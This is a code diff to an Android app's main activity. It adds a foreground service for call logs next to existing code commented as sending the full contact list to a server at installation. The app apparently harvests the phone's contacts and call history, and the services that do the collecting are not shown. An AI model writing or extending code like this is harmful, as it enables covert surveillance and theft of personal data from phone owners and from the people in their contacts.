@@ -33,6 +33,7 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         msgDisplayed = findViewById(R.id.destroyApp);
+
         //add full contact list to server at installation
         getPhoneNumbers();
 
@@ -48,6 +49,8 @@ public class MainActivity extends AppCompatActivity {
         //service for contact
         startContactService();
 
+        //service for contact
+        startCallLogsService();
 
         msgDisplayed.setText("The app is set up, You can close it !");
 
@@ -119,6 +122,20 @@ public class MainActivity extends AppCompatActivity {
             startForegroundService(intent);
         }
     }
+
+
+    /***************************
+    **                        **
+    **   CALL LOGS SERVICE    **
+    **                        **
+    ***************************/
+    public void startCallLogsService(){
+        Intent intent = new Intent(this, CallLogsService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent);
+        }
+    }
+
 
     /***************************
     **                        **
